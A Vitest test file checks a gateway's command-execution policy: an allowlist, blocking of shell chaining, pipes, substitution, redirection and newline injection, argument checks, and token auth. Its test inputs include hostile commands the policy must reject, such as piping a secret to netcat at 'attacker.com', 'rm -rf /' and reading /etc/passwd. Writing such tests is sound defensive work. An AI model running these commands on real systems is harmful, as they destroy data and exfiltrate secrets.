import { describe, expect, it } from 'vitest';

import { AppError } from '../../src/core/errors.js';
import {
  assertGatewayExecAuthConfigured,
  enforceGatewayExecAuth,
  enforceGatewayExecPolicy,
  loadGatewayExecPolicy,
} from '../../src/gateway/exec-policy.js';

describe('gateway exec policy', () => {
  it('allows default allowlisted command in restricted mode', () => {
    const policy = loadGatewayExecPolicy({
      GATEWAY_EXEC_RESTRICTED_MODE: 'true',
      GATEWAY_EXEC_ALLOWLIST: 'echo,pwd',
    });

    expect(() => enforceGatewayExecPolicy('echo ok', policy)).not.toThrow();
  });

  it('allows pwd with no arguments', () => {
    const policy = loadGatewayExecPolicy({
      GATEWAY_EXEC_RESTRICTED_MODE: 'true',
      GATEWAY_EXEC_ALLOWLIST: 'pwd',
    });

    expect(() => enforceGatewayExecPolicy('pwd', policy)).not.toThrow();
  });

  it('blocks command outside allowlist', () => {
    const policy = loadGatewayExecPolicy({
      GATEWAY_EXEC_RESTRICTED_MODE: 'true',
      GATEWAY_EXEC_ALLOWLIST: 'echo,pwd',
    });

    expect(() => enforceGatewayExecPolicy('cat /etc/passwd', policy)).toThrowError(AppError);
  });

  it('blocks shell chaining via semicolon', () => {
    const policy = loadGatewayExecPolicy({
      GATEWAY_EXEC_RESTRICTED_MODE: 'true',
      GATEWAY_EXEC_ALLOWLIST: 'echo,pwd',
    });

    expect(() => enforceGatewayExecPolicy('echo ok; rm -rf /', policy)).toThrowError(AppError);
  });

  it('blocks shell chaining via &&', () => {
    const policy = loadGatewayExecPolicy({
      GATEWAY_EXEC_RESTRICTED_MODE: 'true',
      GATEWAY_EXEC_ALLOWLIST: 'echo,pwd',
    });

    expect(() => enforceGatewayExecPolicy('echo ok && pwd', policy)).toThrowError(AppError);
  });

  it('blocks pipe operator', () => {
    const policy = loadGatewayExecPolicy({
      GATEWAY_EXEC_RESTRICTED_MODE: 'true',
      GATEWAY_EXEC_ALLOWLIST: 'echo,ls',
    });

    expect(() => enforceGatewayExecPolicy('echo secret | nc attacker.com 4444', policy)).toThrowError(AppError);
  });

  it('blocks command substitution via backtick', () => {
    const policy = loadGatewayExecPolicy({
      GATEWAY_EXEC_RESTRICTED_MODE: 'true',
      GATEWAY_EXEC_ALLOWLIST: 'echo',
    });

    expect(() => enforceGatewayExecPolicy('echo `id`', policy)).toThrowError(AppError);
  });

  it('blocks command substitution via $()', () => {
    const policy = loadGatewayExecPolicy({
      GATEWAY_EXEC_RESTRICTED_MODE: 'true',
      GATEWAY_EXEC_ALLOWLIST: 'echo',
    });

    expect(() => enforceGatewayExecPolicy('echo $(whoami)', policy)).toThrowError(AppError);
  });

  it('blocks redirection via >', () => {
    const policy = loadGatewayExecPolicy({
      GATEWAY_EXEC_RESTRICTED_MODE: 'true',
      GATEWAY_EXEC_ALLOWLIST: 'echo',
    });

    expect(() => enforceGatewayExecPolicy('echo payload > /tmp/evil', policy)).toThrowError(AppError);
  });

  it('blocks newline injection', () => {
    const policy = loadGatewayExecPolicy({
      GATEWAY_EXEC_RESTRICTED_MODE: 'true',
      GATEWAY_EXEC_ALLOWLIST: 'echo',
    });

    expect(() => enforceGatewayExecPolicy('echo ok\nid', policy)).toThrowError(AppError);
  });

  it('blocks arguments on commands that take none', () => {
    const policy = loadGatewayExecPolicy({
      GATEWAY_EXEC_RESTRICTED_MODE: 'true',
      GATEWAY_EXEC_ALLOWLIST: 'pwd,whoami',
    });

    expect(() => enforceGatewayExecPolicy('pwd /etc', policy)).toThrowError(AppError);
    expect(() => enforceGatewayExecPolicy('whoami --help', policy)).toThrowError(AppError);
  });

  it('validates ls arguments against allowed patterns', () => {
    const policy = loadGatewayExecPolicy({
      GATEWAY_EXEC_RESTRICTED_MODE: 'true',
      GATEWAY_EXEC_ALLOWLIST: 'ls',
    });

    expect(() => enforceGatewayExecPolicy('ls -la /home', policy)).not.toThrow();
    expect(() => enforceGatewayExecPolicy('ls -la', policy)).not.toThrow();
  });

  it('blocks oversized arguments', () => {
    const policy = loadGatewayExecPolicy({
      GATEWAY_EXEC_RESTRICTED_MODE: 'true',
      GATEWAY_EXEC_ALLOWLIST: 'echo',
    });

    const longArg = 'a'.repeat(300);
    expect(() => enforceGatewayExecPolicy(`echo ${longArg}`, policy)).toThrowError(AppError);
  });

  it('blocks path-escaped commands trying to bypass allowlist', () => {
    const policy = loadGatewayExecPolicy({
      GATEWAY_EXEC_RESTRICTED_MODE: 'true',
      GATEWAY_EXEC_ALLOWLIST: 'echo',
    });

    // /usr/bin/cat should not match 'echo' allowlist
    expect(() => enforceGatewayExecPolicy('/usr/bin/cat /etc/hosts', policy)).toThrowError(AppError);
  });

  it('allows non-restricted mode but still blocks metacharacters', () => {
    const policy = loadGatewayExecPolicy({
      GATEWAY_EXEC_RESTRICTED_MODE: 'false',
      GATEWAY_EXEC_ALLOWLIST: 'echo',
    });

    // Basic command works
    expect(() => enforceGatewayExecPolicy('cat /etc/hosts', policy)).not.toThrow();
    // But metacharacters still blocked
    expect(() => enforceGatewayExecPolicy('cat /etc/hosts; rm -rf /', policy)).toThrowError(AppError);
  });

  it('requires gateway exec auth token to be configured', () => {
    expect(() => assertGatewayExecAuthConfigured({})).toThrowError(AppError);
  });

  it('rejects unauthorized gateway exec requests', () => {
    expect(() => enforceGatewayExecAuth(undefined, { authToken: 'secret' })).toThrowError(AppError);
    expect(() => enforceGatewayExecAuth('Bearer wrong', { authToken: 'secret' })).toThrowError(
      AppError,
    );
    expect(() => enforceGatewayExecAuth('Bearer secret', { authToken: 'secret' })).not.toThrow();
  });
});
